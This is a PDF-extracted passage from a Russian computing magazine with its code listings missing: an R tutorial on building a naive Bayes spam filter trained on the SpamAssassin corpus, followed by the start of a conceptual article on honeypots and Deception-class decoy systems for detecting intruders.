 Согласись, так исходный код выглядит куда более читабельно.


 ВЫВОДЫ
 Поздравляю, ты сделал небольшой шаг в освоении ассемблера! Теперь ты
 можешь соз давать на нем небольшие игрушки. Та, которую мы с тобой сде‐
  лали, занимает всего 70 байт.


 Инструкции и операторы
  Если ты знаешь Си, Java или JavaScript, то вот неболь шая табличка соответс‐
  твия между ассемблерными инструкциями, которые ты сегодня освоил,
  и операторами из этих языков.
КОДИНГ

НЕСКУЧНЫЙ
   DATA SCIENCE

        ПИШЕМ НА ЯЗЫКЕ R
    СОБСТВЕННЫЙ ДЕТЕКТОР СПАМА





Работать в Data Science, как ты мог слы‐
шать, — престижно и денежно. В этой
статье я познакомлю тебя с аза ми языка R,
который используют в «науке о дан ных». Мы
напишем  так называемый наивный бай‐           Антон Карев                                                                                    Эксперт по информационной
есовский  клас сификатор, который  будет         безопасности.профессиональныхОбласть
детектить в почте спам. Конструируя прог‐      интересовразведка, аналитика— технологическаяв сфере
рамму,  ты  увидишь,  как  сухая  скучная        ИБ и интеллектискусственный
                                                                                              vedacoder@mail.ru
математика может быть вполне наг лядной
и полезной. Ты сможешь написать и понять
эту программу, даже если никогда не стал‐
кивался ни с чем подобным.


Сначала, впрочем, дол жен предупредить, что для пол ного понимания будет
хорошо, если ты уже знаком с азами ста тистичес ких методов. Я, конечно,
постараюсь изложить материал так, чтобы у вдумчивого читате ля, нез накомо‐
го со статистикой, тоже был шанс вникнуть в тему, но теоре тические основы
статистики останутся за рамками этой статьи.
  Плюс я исхожу из того, что ты, с одной стороны, хорошо подкован в теории
и практике программирова ния, раз бираешь ся в алго ритмах и структурах дан‐
ных, но, с другой стороны, еще не сталкивался с языком R. Я поз накомлю
тебя с ним в том объеме, которого тебе хва тит, чтобы комфортно написать,
запустить и понять первую программу.


ЗНАКОМИМСЯ С ЯЗЫКОМ R И ГОТОВИМ РАБОЧЕЕ МЕСТО
Для начала посмотрим, как установить R и как в нем запускать и отлаживать
программы, как искать и уста навливать нужные биб лиоте ки (в мире R они
называются пакетами), как удобно искать документацию к разным функциям.
   Язык R чрезвычайно мощный в том, что каса ется обработки и анализа дан‐
ных. Де‐факто это стандарт в Data Science. Язык соз дан математиками‐ста‐
тистиками для математиков‐ста тистиков. В нем, как и в дру гих инструментах,
предназначенных для наукоемких вычислений, самый ходовой тип дан‐
ных — это вектор. Самая популярная структура данных в R — это data frame
(срез данных). Срез данных представляет собой матрицу с атри бутами,
которая по виду очень похожа на реляци онную БД.
   IDE для R качай с официального сайта. Дос тупны версии для трех ОС: Lin‐
ux, Mac и Windows. Уста новка должна пройти легко, но если что‐то пойдет
не так, попробуй первым делом заглянуть в FAQ.
   Теперь запускаем IDE. Выглядеть она будет примерно так.





Подсветка синтаксиса здесь, конечно, так себе — вернее, ее вообще нет, —
так что код можно спокойно писать в каком‐нибудь другом редакторе, а IDE
использовать только для запуска уже готового кода. Лично я пишу на R в он‐
лайновом редак торе на rextester.com.
   Чтобы уста новить нужный пакет (биб лиотеку), используй функцию in‐
stall.packages. В install.packages есть полезная опция — suggests.
По умолчанию ей присвоено значение FALSE. Но если перевес ти ее в TRUE,
install.packages подгру зит и установит все вторичные пакеты, на которые
полагается тот пакет, который ты ставишь. Рекомендую всегда устанавливать
эту опцию в TRUE, особенно когда начинаешь с чистого листа и только‐только
(пере)установил R.
   Вот тебе для удобства скрипт, который проверяет, установлены ли нужные
тебе пакеты. Если какие‐то из них не установлены, скрипт подгружает и уста‐
навливает их. Перепечатай и сохрани скрипт в файл update_packages.r.
Сейчас он подгружает только два пакета, которые нам понадобятся, когда
будем писать детектор спа ма. По мере необ ходимости можешь добавлять
и другие пакеты.





Чтобы вы пол нить скрипт (и этот, и все остальные, которые ты напишешь),
сначала переключи рабочую директорию на ту, куда его сохранил. Для этого
введи в консоль R функцию setwd (например, setwd("e:/work/r")). Потом
выпол ни команду source вот таким образом: source("install_packages.
r"). Она запустит твой скрипт, и ты уви дишь, как подгружаются пакеты,
которые у тебя еще не уста новлены.
   Чтобы под ключить пакет к программе, используй функцию library
или require. Например, library('tm').
   Чтобы найти докумен тацию к фун кции, просто введи в консоли ?xxx,
где xxx — имя интересующей тебя функции. IDE откроет в браузере страницу
с информацией по этой функции.


Готовим данные
Сначала давай подготовим наборы данных для тренировки и проверки
будущего детектора. Предлагаю взять их из архива Apache SpamAssassin.
По ссылке ты найдешь подборку писем, расфасованную по трем категориям:
spam (собствен но, спам), easy_ham (правомерные письма, которые легко
отличить от спама), hard_ham (пра вомерные пись ма, которые тяжело отли‐
чить от спама).
  Создай в своей рабочей директории папку data. Перейди в нее и создай
в ней еще пять папок:
 • easy_nonspam_learn, easy_nonspam_verify ;
 • spam_learn, spam_verify;
 • hard_nonspam_verify .

По папкам spam_learn и spam_verify рас предели по‐братски письма
из spam. По папкам easy_nonspam_learn, easy_nonspam_verify – из папки
'easy_ham'. В папку hard_nonspam_verify ско пируй все письма из hard_ham.
   Как ты уже наверно догадался, пись мами из папок _learn мы будем тре‐
нировать свой детектор отличать спам от не‐спама, а письмами из папок
_verify – будем проверять, как хорошо он научился это делать.
  Но почему тогда мы не соз дали папку hard_nonspam_learn? Для остроты
эксперимента! Мы будем тренировать детектор только теми письмами,
которые легко отличить от спама. А в конце посмотрим, сможет ли он узна‐
вать в письмах из категории hard_nonspam пра вомерную почту без пред‐
варительной тренировки.


Как конструируют признаки
Теперь, когда у нас есть исходные данные для тренировки и проверки, нам
нужно «сконструировать признаки», которые наш детектор будет выискивать
в сырых текстовых файлах с пись мами. Умение констру ировать признаки —
один из базовых навыков в Data Science. Залог успеха здесь — профес‐
сиональная интуиция, которая приходит с годами практики. Компьютеры пока
еще не могут делать эту работу авто матичес ки, вместо нас. И, скорее всего,
никогда не смогут.
  С другой стороны, компь ютеры могут облегчить нашу работу по констру‐
ированию признаков. В частнос ти, у R есть пакет tm (от слов Text Mining),
предназначенный для ана лиза текстов. С его помощью мы подсчитаем, какие
слова чаще все го встречаются в спаме и в не‐спаме, и будем использовать
их частотность в качестве признаков.
  Современные детекторы спама делают значитель но больше, чем подсчи‐
тывание частоты слов, но, как ты скоро убедишь ся, даже наш простенький
детектор будет весьма неплохо отделять спам от не‐спама.
  В основу нашего детектора положим на ивный байесовский классифика‐
тор. Логика его работы такая: если видим слово, которое в спаме встре чает‐
ся чаще, чем в не‐спаме, то кладем его в копилку спам‐приз наков. По такому
же принципу фор мируем копилку признаков для не‐спама.
   Как эти признаки помогут нам отделять спам от не‐спама? Мы ищем в ана‐
лизируемом письме оба вида признаков. Если в ито ге получается, что приз‐
наков спама больше, чем признаков не‐спа ма, зна чит письмо спамное, ина‐
че — правомерное.
  Вычисляя вероятности того, спам ли наше пись мо, мы не учитываем, что
какие‐то слова могут быть вза имо зависимыми. Мы оце ниваем каждое слово
в отрыве от всех остальных слов. На ста тистичес ком сленге такой подход
называется «статистичес кой независимостью». Ког да математики‐статистики
исходят из такого предположения, не будучи до конца уверенными в том, что
оно здесь правомерно, они говорят: «Наша модель наивная». Отсюда и наз‐
вание: наивный байесовский классифика тор, а не просто байесовский клас‐
сификатор.


Пишем функцию чтения писем из файлов
Сначала подгружаем библиотеки, которые нам понадобятся, и прописываем
пути к папкам, в которых хранятся файлы с письмами.





Каждый отдельно взятый файл с пись мом состоит из двух блоков: заголовок
с метаданными и содержание пись ма. Первый блок отделен от второго пус‐
той  строкой  (это осо бенность протокола  электронной  почты описана
в RFC822). Метаданные нам не нуж ны. Нас интересует только содержимое
письма. Поэтому напишем функцию, которая считыва ет его из файла с пись‐
мом.





Что мы тут делаем? В языке R файловый ввод/вывод осуществля ется точно
так же, как и в большинстве других языков программирования. Функция
getMessage получает на входе путь к фай лу и открывает его в режиме rt (read
as text — читать как обычный текст).
  Обрати внимание, здесь мы используем кодировку Latin‐1. Зачем? Потому
что во многих письмах есть символы, которых нет в кодировке ASCII.
  Функция readLines считыва ет тексто вый файл построчно. Каждая строка
становится отдельным элементом в векторе text.
  После того как мы прочитали из файла все строки, ищем первую пустую,
а затем извле каем все стро ки пос ле нее. Резуль тат помещаем в вектор msg.
Как ты, наверно, понял, msg — это и есть содержимое письма, без заголовоч‐
ных метаданных.
  Наконец, сворачиваем весь вектор msg в единый блок текста (см. часть
кода с функцией paste). В качестве разделителя строк используем символ
\n. Зачем? Так его будет удобнее обра батывать. И быстрее.
  Сейчас создадим вектор, который будет содержать текстовые сообщения
из всех спамных писем. Каж дый отдельно взятый элемент вектора —
это отдельное письмо. Зачем нам такой вектор? Мы будем с его помощью
тренировать свой детектор.





Сначала мы получаем список всех файлов из папки со спамом. Но там,
помимо писем, еще хранится файл cmds (служеб ный файл с длинным спис‐
ком Unix‐команд на перемещение фай лов), который нам не нужен. Поэтому
вторая строчка из предыдущего фраг мента кода удаляет имя этого файла
из итогового списка.
   Чтобы создать нужный нам вектор, вос пользуемся функцией sapply,
которая применит функцию getMessage ко всем именам фай лов, которые мы
только что получили при помощи dir.
  Обрати внимание, здесь мы передаем в sapply безымянную функцию —
чтобы объединить имя файла и путь к каталогу, где он лежит. Привыкай,
для языка R это весьма распростра ненная конструкция.


Готовим корпус текстов для спамных писем
Теперь нам надо создать корпус текстов. С его помощью мы сможем манипу‐
лировать термами в пись мах (в корпусной лингвис тике сос тавные части тек‐
ста, в том числе сло ва, называют термами). Зачем нам это? Чтобы сконстру‐
ировать признаки спама для нашего детектора.
   Технически это значит, что нам надо создать терм‐документную матрицу
(TDM), у которой N строк и M стол бцов (N – количество уникальных термов,
найденных во всех документах; M — количество документов в корпусе тек‐
стов). Ячейка [iTerm, jDoc] ука зывает, сколь ко раз терм с номером iTerm
встречается в письме с номером jDoc.





Функция getTDM получает на вхо де вектор со всеми текстовыми сообщени‐
ями из всех спам ных писем, а на выходе выдает TDM.
  Пакет tm позволяет конструировать корпус текстов несколькими способа‐
ми, в том числе из вектора писем (смотри функцию VectorSource). Если тебе
интересны альтернативные источники, набери в R‐консоли ?getSources.
  Но прежде чем конструировать корпус, мы должны сказать пакету tm,
как надо вычищать и нормализовывать текст. Свои пожелания мы передаем
через параметр control, который представляет собой список опций.
   Как видишь, мы здесь используем четыре опции.
 1. stopwords=TRUE — не принимать во внимание 488 стоп‐слов (рас‐
   пространенные сло ва английского язы ка). Чтобы посмотреть, какие слова
   входят в этот список, набери в консоли stopwords() .
 2. removePunctuation=TRUE и removeNumbers=TRUE — говорят сами
   за себя. Мы их исполь зуем для уменьшения шума от соответс твующих
  символов. Тем более что многие наши пись ма напичканы HTML‐тегами.
 3. minDocFreq=2 — строки в нашей TDM нуж но соз давать только для тех
   термов, которые встречаются в корпусе текстов больше одного раза.


Готовим почву для конструирования признаков
Напомню, мы хотим натренировать детектор таким образом, чтобы он мог
оценивать вероятность того, что анализи руемое пись мо — это спам. Как мы
собираемся это делать? Выис кивая в анализируемом письме термы, которые
для нас являются признаками спама. И вот что для этого нужно сделать
в коде…
  Мы воспользуемся только что созданной TDM, чтобы соз дать набор обу‐
чающих данных из спамных писем. Для этого сделаем срез данных, который
будет включать в себя суммарную частотность всех термов — они в пос леду‐
ющем смогут служить признаками того, что ана лизи руемое письмо это спам.





Что мы здесь делаем? Что бы получить срез данных, мы сначала конверти‐
руем свою TDM в стандартную R‐матрицу (функция as.matrix). Затем
при помощи rowSums создаем вектор, в котором для каждого терма выс‐
читывается суммарная частота со всех спамных писем.
   Дальше объединяем строковый (с термами) и чис ловой (с частотностью)
векторы, используя функцию data.frame.
  Наконец, немного  облагора живаем наши  данные:  задаем  подписи
для столбцов и конвертируем час тоты в числовое представление.


Генерируем тренировочные данные





В этом небольшом фрагменте кода мы сначала для каждого терма вычисляем
процентную часть документов, в которых он встречается (occurrence). Как мы
это делаем? Прогоняем каждую строку (то есть каж дый терм) через безымян‐
ную функцию (передана в качес тве аргумента в sapply), которая сначала
подсчитывает количество ячеек, зна чение в которых больше нуля, а потом
делит полученную сумму на количество столбцов в TDM (то есть на количес‐
тво документов в спамном корпусе текстов).
   Дальше вычисляем плот ность терма (density) по всему корпусу текстов.
  Наконец, при помощи функции transform добавляем к своему сре зу дан‐
ных два только что вычис ленных вектора: spam_learn.occurrence (процен‐
тная часть документов, в которых встречается рассматриваемый терм)
и spam_learn.density (плотность терма по всему корпусу текстов).
   Всё! Набор тренировочных данных для спамной части нашего детектора
готов. Давай проверим их: пос мотрим, какие термы из спамного корпуса тек‐
стов оказались самыми яркими индикаторами. Для этого отсортируем наш
spam_learn.df по стол бцу occurrence и пос мотрим что получилось. Вве ди
в консоли R:


head(spam_learn.df[with(spam_learn.df, order(‐frequency)),])

Результат должен выглядеть как‐то так.





Как видишь, HTML‐теги — это наиболее яркие индикаторы спама. На их долю
приходится больше 30 % писем из спамных тренировочных данных.


ОБРАБАТЫВАЕМ ПИСЬМА EASY_NONSPAM
С письмами из папки easy_nonspam_learn делаем то же самое, что и со спа‐
мом. Код практически такой же.





Единственное отличие (смотри 80 строку): мы считываем из easy_non‐
spam_learn не все пись ма (их там больше 2000), а столько, сколько прочита‐
ли из папки spam_learn (порядка 500). Зачем такая уравниловка? Чтобы
детектор  работал  бес пристрастно.  А  то  если  его  перетренировать
на какой‐то одной категории писем, то он будет видеть спам там, где его нет,
или наоборот.
   Теперь набор тренировочных данных для не‐спамной час ти нашего детек‐
тора тоже готов. Давай посмотрим, что получи лось:


head(easy_nonspam_learn.df[with(easy_nonspam_learn.df, order(‐
frequency)),])

Результат должен выглядеть как‐то так.





                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
    НЕСКУЧНЫЙ DATA
            SCIENCE
             ПИШЕМ НА ЯЗЫКЕ R СОБСТВЕННЫЙ
                               ДЕТЕКТОР СПАМА





ПИШЕМ КЛАССИФИКАТОР
Итак, у нас есть два набора тренировочных данных, то есть две копилки приз‐
наков: для спама и для не‐спа ма. Как они помогут нашему детектору отделять
зерна от плевел? Детектор будет вычислять для каждой из копилок «наивную
байесовскую вероятность» того, что ана лизируемое письмо относится к ее
категории. Вот функция, которая воплощает эту идею.





Мы передаем ей четыре парамет ра:
 1. path — письмо, которое надо проана лизи ровать;
 2. trainingDF — срез данных по тому тренировочному набору, с которым
  мы хотим сравнить ана лизируемое пись мо;
 3. prior — наше «наивное предположение» по поводу того, какая часть
  писем (в процентах) обычно ока зывается спамом;
 4. cNone — константа веро ятности, которую мы присваиваем новым тер‐
  мам — тем, которых нет в тренировочных письмах.

Обрати внимание, как я здесь расправляюсь с теми термами анализируемого
письма, которых не было в тренировочных пись мах и которые наш детектор
поэтому не знает. Вернее, что я делаю с их нулевой час тотностью. Если их
частотность оставить такой, какая она есть, то функция classifyEmail
не сможет работать правильно. Ведь в ней вычис ления построены на перем‐
ножении час тот. Если хотя бы один из множителей будет нулем, — а такое
будет случаться весьма часто, — то результат неизменно будет нулем.
  Поэтому термам с нулевой час тотностью я присваиваю небольшую кон‐
стантную частоту: 0,1 %, — то есть час тоту, которая заведомо меньше, нам‐
ного меньше, чем те частоты, которые зафиксирова ны в наших тре нировоч‐
ных данных. Кстати говоря, такой спо соб обрабатывать неизвес тные термы —
весьма распространенный подход в Data Science.


Как работает classifyEmail
Обрати внимание, пер вые три шага мы здесь дела ем точно так же, как при
обработке тренировочных данных:
 1. get.msg извлекает текст из письма;
 2. get.tdm пре образует этот текст в TDM;
 3. rowSums рассчитыва ет частотность.

Дальше нам надо определить, как термы из анализируемого письма пересе‐
каются с термами из наших тренировочных данных. Для этого задействуем
команду intersect. Переда ем ей термы, найденные в анализируемом пись‐
ме, и термы из тренировочных данных.
  Завершающий шаг клас сификации: определить, есть ли в анализируемом
письме какие‐то термы, которые также есть и в наших тренировочных данных.
Если такие есть, исполь зуем их, чтобы понять, какова вероятность, что ана‐
лизируемое письмо относится к категории того сре за данных, которые
переданы параметром trainingDF.
   Как все это выглядит вживую? Допустим, мы пыта емся оценить, спам рас‐
сматриваемое письмо или нет. Функция msg.match выдает все термы из ана‐
лизируемого письма, которые есть в спамном срезе данных (spam_learn.
df). Если таких термов нет вообще (length(msg.match) < 1), то функция
заменяет нулевые частоты зна чением cNone.


Проверяем детектор
Тестировать наш детектор, натрениро ванный на письмах spam и easy_non‐
spam, будем сложными пись мами: hard_nonspam.





Что мы здесь делаем? Сна чала, как и всегда, берем список файлов с пись‐
мами. Потом делаем два прогона через клас сификатор. Первый прогон
для проверки принадлежности к спа му, второй — к не‐спаму. В итоге у нас
получается два вектора: hard_nonspam_verify.spam_test и hard_non‐
spam_verify.nonspam_test. Мы попарно сравниваем числовые значения
из этих векторов и подсчитыва ем результат: сколько писем больше похоже
на спам, а сколько — на не‐спам.
   Тебе навер няка не терпится пос мотреть, какой счет получился в итоге,
и понять, насколько хорошо детектор спра вился со своей работой. Однако
перед тем как показать результат, хочу напомнить тебе две вещи. 1) Нам
заведомо известно, что в той выборке писем, которую мы только что тес‐
тировали, спама нет. Поэто му в идеале счет чик спама должен остаться
нулевым. 2) Мы знаем, что пись ма этой выборки сложно классифицировать,
потому что в них встречаются термы, которые явля ются яркими инди каторами
спамности. Это я к чему? К тому, что результат скорее всего получится
не очень вдохновляющим. Так какой же он?





Наш детектор сработал с погрешностью в 8%. Для коммерчес кой программы
это, конечно, непозволительно много, но для простенького детектора,
который мы с тобой писали в обра зовательных целях, результат впол не при‐
ятный. Особенно если учесть тот факт, что письма из категории hard_non‐
spam наш детектор здесь видел впервые, ведь они не были включены в тре‐
нировочную выборку.


Тестируем детектор
Сначала те три действия, которые выполняли на предыдущем участке кода
(для сравнения спама и не‐спама), завернем в простенькую функцию spam‐
Classifier. Что она делает? Если пись мо больше похоже на спам, возвра‐
щает единицу, иначе ноль.





Теперь, чтобы протестировать работу детектора, загружаем письма из папок
с суффиксом _verify. Ты же помнишь, что изна чально мы поделили письма
на две части: для тренировки детектора (суффикс _learn) и для его проверки
(суффикс _verify)?





Дальше прогоняем детектор по письмам всех трех категорий. Прогоняем так
же, как делали это рань ше. Единственное отличие: мы для простоты исполь‐
зуем функцию spamClassifier, а не classifyEmail.





Затем готовим итоговый срез данных, по которо му будет видно, как детектор
отработал. Мы это уже делали чуть выше.





Посмотри, что получилось в ито ге: head(classDF).





Судя по первым шести строчкам таб лицы, детектор справляется со своей
работой хорошо, но для более объективной картины давай подсчитаем лож‐
ноположительные и ложноотрицательные срабаты вания — суммарно по всем
письмам.





Что мы здесь делаем? Создаем матрицу из трех строк и двух стол бцов. Стро‐
ки —   это  фактичес кая   категория  письма    (spam,  easy_nonspam,
hard_nonspam), а стол бцы — категория, которую опре делил наш детектор.
В идеале, у нас дол жно получиться [1, 1, 0] в первом стол бце и [0, 0, 1]
во втором. А вот как у нас получилось на самом деле.





Из таблицы видно, что наш клас сификатор работа ет хоть и не идеально,
но вполне хорошо.


РИСУЕМ РЕЗУЛЬТАТ НА ГРАФИКЕ





Что мы здесь делаем? Отражаем на графике, как сильно (в процентах) пись‐
мо похоже на спам (ось OX) и на не‐спам (ось OY). Причем выводим данные
в логарифмическом масштабе. Зачем такое ухищрение? Потому что разброс
значений,  которые мы наносим  на  гра фик,  очень  большой.  Поэтому
без логарифмического преобразова ния результат получился бы менее наг‐
лядным.
   График, сохраненный в формате PDF, ты найдешь в своей рабочей папке,
в подкаталоге images.





В  идеале,  весь  спам  должен  ока заться выше  диагональной  линии,
а не‐спам — ниже. Как видишь из рисунка, наш результат хоть и выглядит
весьма неплохо, но все‐таки не идеален.
   Анализируя график, мы можем извлечь некоторое интуитивное пред став‐
ление о слабых местах своего детектора. Мы видим, что некоторые письма
прижаты к оси OX. У них значение Prob(SPAM) равняется нулю. Другие при‐
жаты к OY — у них значение Prob(SPAM) равняется нулю. А некоторые письма
вообще прижаты к точке ноль.





Все эти наблюдения указывают на то, что мы подготовили не очень удачный
набор тренировочных данных для не‐спама. Потому что, гля дя на результат
обработки проверочных писем, мы видим: есть намного больше термов,
которые было бы неплохо задействовать в качес тве индикаторов не‐спама,
чем тот набор, который мы фактичес ки используем.
  Оно и понятно. Ведь мы конс тру ировали упро щенный детектор спама.
Само собой, его можно раз вивать и совершенс твовать. Что я и предлагаю
тебе сделать в качестве домашнего задания. Если дерзнешь, обязательно
поделись в комментариях к статье сво ими успехами на этом поприще.


        WWW

                    •Исходный код к статье
АДМИН

  ТЕХНОЛОГИЯ
ОБМАНА





      Вячеслав Круглов                                                   Борис Королев
      Golang‐разработчик в
    области информационной
   безопасности. Окончил МГТУ
     им. Баумана в 2020 г. и
   Технопарк от mail.ru в 2018 г.
         st.yaches@mail.ru





   ЧТО ТАКОЕ DECEPTION И КАК ТЕПЕРЬ
       ОБМАНЫВАЮТ ХАКЕРОВ



Ты наверняка слышал про ханипо ты — цели‐приманки,
по атакам на которые вычисляют хакеров. В последние годы
эта технология проапгрейдилась и теперь носит общее наз‐
вание Deception. О том, в чем отличия и как хакеров пыта‐
ются водить за нос, мы и поговорим.


Слово deception переводится с английского как обман. Это название очень
точно отражает суть решения — ведь что бы пой мать атакующе го, ловушки
должны быть неотличимы от нас тоящих сервисов.
  Сегодня эта технология представлена в основном зарубежными — аме‐
риканскими и израильскими — вен дорами. Среди них самые извес тные —
TrapX, Illusive Networks, Fidelis, Cymmetria MazeRunner, Canary. С российски ми
производителями пока не очень. У нас есть Honeypot Manager «Кода
безопасности», выпущенный в 2009 году, — уже не просто ханипот, но еще
и не полноценный Deception. Есть пара свежих полноценных решений — Bas‐
tion Security Platform, которую делаем мы с моими кол легами в «Бастионе»,
и Xello. Также можно найти нес колько опенсорсных программ.
  Собственно, с позиции разработчика я и планирую рассказать о том, что
такое Deception и чем он интересен. Но сначала поговорим о предтече этой
технологии — ханипо тах.


ГОРШКИ С МЕДОМ
Honeypot («горшочек с медом») можно считать первой инкарнацией тех‐
нологии Deception, а появились они еще в конце восьмидесятых — начале
девяностых годов. Ханипот — это сетевой объект, единственная цель которо‐
го — привлекать злоумышленника и быть атакованным.
   Ханипот не несет иной ценности в сети, в которой установлен; с ним
не ведется никаких легитимных сетевых взаимодей ствий. Когда ханипот ата‐
куют, он фиксирует это и сохраня ет все действия атакующе го. В дальнейшем
эти данные помогают анализировать путь злоумышленника.
  Побочная цель ханипо та — задержать продвижение атакующего по сети,
заставив его потратить время на изу чение лож ного ресурса.
   Ханипот может быть полноценной операционной системой, которая эму‐
лирует рабочее место сотрудника или сервер, либо отдельным сервисом.





Однако сам по себе ханипот имеет ряд недостатков:
 • нужно отдельно настраивать каждый лож ный сервер;
 • ханипоты не взаимо действу ют меж ду собой и с элементами нас тоящей
   инфраструктуры. Они не оставляют следов, хакеру их трудно обнаружить;
 • ханипоты, как правило, не объединены в центра лизованную систему.

На смену этой технологии пос тепенно пришла другая, более продвинутая
и умная, — Deception.


СУТЬ ТЕХНОЛОГИИ ОБМАНА
Deception относится к решениям клас са Intrusion Detection System (IDS) —
системам обнаружения вторжений. Основная цель такой системы — выявлять
попытки нежелательного доступа к сети. Иными словами, Deception помогает
обнаруживать сетевые ата ки.
  В чем отличие Deception от ханипотов? Ханипот — это отдельный сетевой
ресурс, который ни с кем не взаимодействует, а толь ко ждет атакующего, что‐
бы записать его действия. Deception же — это централизованная система
управления ложными сетевыми объекта ми, которые принято называть ловуш‐
ками (decoys). Каждая ловушка представляет собой, по сути, отдельный
ханипот, однако все они свя заны с центральным сервером.





Такие решения обыч но имеют удобный интерфейс для управле ния ловуш‐
ками. Оператор может соз давать ловушки с жела емым набором эму лируемых
сетевых сервисов, в выбранной подсети, с нуж ным способом получе ния IP‐
адреса и так далее.
  Ловушки и эмулиру емые на них сервисы поддерживают пос тоянное
соединение с сервером. Так же как и ханипоты, ловушки в Deception не пре‐
дусматривают легитимного сетевого вза имодействия (за исключением вза‐
имодействия с другими компонентами Deception).
  Ловушка будет сооб щать на сервер о любой попытке взаимодействия
с ней: это служит индикатором атаки. При этом оператор может моментально
получить уведомление о произошедшем событии. В нем будут указаны
детали произошедшего: адрес и порт источни ка и цели, протокол взаимодей‐
ствия, время срабатывания и так далее.
  Дополнительные модули в сос таве Deception также могут пре доставлять
возможность руч ного или автоматизированного реагирования на инциденты.





В понятие Deception могут входить и другие вещи. Некоторые компоненты
помогают упростить нас тройки и автоматизацию раз верты вания, другие
делают  ловушки  больше  похожими  на  нас тоящие  сетевые  сервисы,
еще одни — прив лекают внимание хакеров к ложным целям.
  Некоторые компоненты могут решать смежные задачи — например,
реагировать на инциденты, собирать индикаторы компрометации с рабочих
станций и искать на них уяз вимое ПО.


АГЕНТЫ
Агент — это программа, которая устанавлива ется на реальные рабочие стан‐
ции пользователей или серверы. Она умеет общать ся с сервером Deception,
исполнять его команды или переда вать в центр управления полез ные данные.
  Среди решений класса Deception есть как продукты, в состав которых вхо‐
дит агент, так и те, которые обходятся без него.





В задачи агента может вхо дить:
 • сбор данных о состоянии рабочих станций;
 • распространение приманок;
 • эмуляция активности в сети;
 • реагирование на инциденты (ручное или автоматизированное);
 • сбор данных для форен зики;
 • что‐то еще — в меру потребностей клиентов и фантазии разработчика.

Деятельность агента есть смысл сделать скрытой от человека, который
работает за компьюте ром. Зачем? Во‐первых, поль зователь может намерен‐
но или случайно удалить агент или его составляющие.
   Во‐вторых, наличие неизвес тно го (или извес тного до определенной сте‐
пени — если пользователь об этом предуп режден) ПО на рабочей станции
может вызвать ощущение дискомфорта.
   В‐третьих, все, что видит пользователь, увидит и атакующий, получивший
доступ к этому компьютеру. А ведь мы не хотим раскрыть свои карты
перед атакующим, правда?
  Поэтому агентские решения в составе Deception следует делать таким
образом, чтобы пользователь не видел ни агента, ни сле дов его жизнеде‐
ятельности (или хотя бы старать ся свести это к минимуму).
  Поэтому аген ты обычно работа ют в привилегированном режиме, в виде
драйвера для Windows либо модуля ядра в случае с Linux. Это позволяет, нап‐
ример, перехватывать системные вызовы для обеспечения скрытности, а так‐
же не дает пользователю удалять агент или мешать ему работать.


ПРИЕМЫ МИМИКРИИ
Задачи Deception как технологии — убедить ата кующего в том, что все ловуш‐
ки и взаимодействия меж ду ними реальны, ценны и используются, а также
сделать ложные цели привлекательными для атаки. В современных системах
есть ряд компонентов, которые отвечают за эти цели.


Приманки
Чтобы атакующий с большей вероятностью нат кнул ся на ловушку, можно его
к этому подтолкнуть. Как? Для это го в Deception используются приманки,
или «хлебные крошки».
  Приманка — это объ ект, который размещается на реальной рабочей стан‐
ции, скрытно или не очень. Приманка выглядит как что‐то обычное и прив‐
лекательное для атакующего («случайно» забытый файл с паролем, сохранен‐
ная сессия, закладка в бра узере, запись в реес тре, примонтированная шара
и подобное). Приманка содержит ссылку и данные для доступа на ложный
сетевой ресурс.
  Злоумышленник, обнаружив такую ссылку и авторизационные данные,
конечно же, захочет про верить, что это за сервис. Он заходит на ловушку,
и тут срабатывает сигнализа ция об инциденте.





Виды и способы размещения приманки зависят от типа ловушки, на которую
приманка ведет.
  Приманки могут распространять ся нес колькими способами. Если в сос‐
таве Deception присутству ют агенты, задача разбрасывания приманок воз‐
лагается на них. В этом случае процесс можно легко автоматизировать: сер‐
вер управле ния посыла ет команду на агент, и тот выполняет необходимые
действия для установки приманки.
   Если агентов нет, Deception‐решение может предлагать готовые скрипты,
которые необходимо будет выполнить на рабочих станциях вручную. Этот
подход обладает очевидными недос татка ми: например, при перенастройке
ловушек нет возможности автоматически обновить приманки на рабочих
станциях, тогда как агенты позволяют это сделать.
  Следует, насколько это возможно, ограничить взаимодействие настоящих
пользователей ПК с приманками. Одна ко слишком сильно скры вать ложные
цели тоже нельзя. Если зло умышленник не сможет их найти, для чего они
вообще нужны?
  И конечно, приманки должны быть правдоподобными. Если мы пос тавим
приманку в виде SSH на компьютер бухгалтера, это может вызвать подоз‐
рения атакующего.
  Зачастую приманка содержит авторизационные данные для доступа
к ловушке — логин и пароль или ключ. Но как правильно их составить, чтобы
они выглядели правдоподоб но? Тут и появляется мысль вести внутри Decep‐
tion базу фейковых поль зователей.


Ложные пользователи
Итак, мы хотим подставлять в приманке данные для авторизации, максималь‐
но похожие на настоящие. При этом в каждой организации данные поль‐
зователей выглядят по‐разному. У всех раз ные форматы логина (например,
часто встречаются логины вида «первая буква имени — точка — фамилия»
латиницей). У всех разные парольные политики. Для некоторых приманок
могут понадобиться почтовый адрес, адрес домена, что‐то еще. Как быть?
  Задачу можно решить, ведя базу ложных пользователей сети. Есть разные
подходы к ведению такой базы.





Например, Deception мож но интегрировать с системой анализа трафика.
Это дает возможность рас позна вать в сетевом трафике наличие данных
для авторизации, находить в них общие черты и генерировать пользователей,
похожих на настоящих, по выявленным пра вилам.
   Если такой интеграции нет, хорошим решением выглядит генерация поль‐
зователей по заданным вручную пра вилам. Среди таких правил может быть
выбор определен ного словаря имен, задание шаблона для логина, задание
правил генерации пароля (наличие спецсимво лов, минимальная длина,
генерация запоминающихся паролей, выбор паролей из словаря и так
далее), задание адреса домена, почтового сервера.
   Такой подход может пригодиться, если компания с помощью Deception
защищает филиалы, расположенные в разных странах. Тогда,  скажем,
для российского филиала у ложных пользователей могут быть име на из рус‐
ского словаря, а для китайского — из китайского.
   Когда сформирована база ложных пользователей,  Deception может
использовать ее при создании приманок. Для большей реалистичности мож‐
но делать связку между агентом и ложным поль зователем так, чтобы все при‐
манки, размещенные на этом агенте, были от имени одного человека.


Эмуляция сетевого взаимодействия
Если традиционные ханипо ты существу ют сами по себе, ни с чем не взаимо‐
действуют и не оставляют следов в сети, то технология Deception направлена
в том числе на то, что бы подтолкнуть злоумыш ленни ка к взаимодей ствию
с ловушкой.
  Для этого атакующему надо подска зать, где искать ловушку, и заставить
его подумать, что это реальный сервис. Представь, что ты нашел в сети некий
сервис, и результат пассивного сниффинга показывает, что с ним никто
и никогда не взаимо действу ет. Подозрительно? Да!
  Поэтому одна из фишек Deception — это воз можность активно эмулиро‐
